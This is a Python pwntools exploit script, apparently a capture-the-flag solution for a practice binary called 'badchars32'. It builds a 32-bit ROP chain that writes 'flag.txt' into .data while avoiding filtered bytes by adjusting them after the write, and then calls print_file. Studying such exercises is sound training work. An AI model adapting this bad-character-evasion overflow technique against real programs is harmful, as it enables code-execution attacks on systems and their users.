from pwn import *
offset = 44
context.binary = elf = ELF('badchars32')

'''
;-- usefulGadgets:
0x08048543      005d00         add byte [ebp], bl
0x08048546      c3             ret
0x08048547      305d00         xor byte [ebp], bl
0x0804854a      c3             ret
0x0804854b      285d00         sub byte [ebp], bl
0x0804854e      c3             ret
0x0804854f      8937           mov dword [edi], esi



Need control over edi esi ebp and ebx

pop_ebx_esi_edi_ebp
0x080485b8                 5b  pop ebx
0x080485b9                 5e  pop esi
0x080485ba                 5f  pop edi
0x080485bb                 5d  pop ebp
0x080485bc                 c3  ret

pop_ebx
0x080485d6                 5b  pop ebx
0x080485d7                 c3  ret

We write into 
[Section]
nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
24  0x00001018    0x8 0x0804a018    0x8 -rw- .data


'''

# x g a .
badchars = [0x78, 0x67, 0x61, 0x2e]
# replace with 0x79(y), 0x68(h), 0x62(b), 0x2f (/)

sub_mebp_bl = 0x0804854b
move_medi_esi = 0x0804854f

pop_ebp = 0x080485bb
pop_ebx = 0x080485d6
pop_ebx_esi_edi_ebp = 0x080485b8

what1 = unpack(b'flbh')
what2 = unpack(b'/tyt')

where = 0x0804a018


print_file = 0x08048538


payload  = b'A'*offset

# set register for write 'flbh' into .data and for sub 0x1 to char b (data+2) data_addr=where
payload += p32(pop_ebx_esi_edi_ebp) + p32(0x1) + p32(what1) + p32(where)   + p32(where+2)
# now actually writing 'flbh' into .data
payload += p32(move_medi_esi)
# now sub 0x1 to 3rd char of 'flbh' (b @ data+2)
payload += p32(sub_mebp_bl) # now in dta we have 'flah'

# same but write '/tyt' and sub for char 'h'
payload += p32(pop_ebx_esi_edi_ebp) + p32(0x1) + p32(what2) + p32(where+4) + p32(where+3)
payload += p32(move_medi_esi) # now we have 'flah/tyt' @ .data
payload += p32(sub_mebp_bl)   # now we have 'flag/tyt'

# now I will change only the ebp but remember ebx fixed to 0x1
# so we will subtract 0x1 where ebp point
payload += p32(pop_ebp) + p32(where+4) # change only ebp (where sub)
payload += p32(sub_mebp_bl)   # now we have 'flag.tyt'
payload += p32(pop_ebp) + p32(where+6) # same but for the 'y' 
payload += p32(sub_mebp_bl)   # now we have 'flag.txt'

# calling only one function at the end of rop chian
# so I will not use the plt
payload += p32(print_file) + p32(where) 

p = elf.process()
#gdb.attach(p)

p.recv()
p.sendline(payload)
log.info(p.recvall())







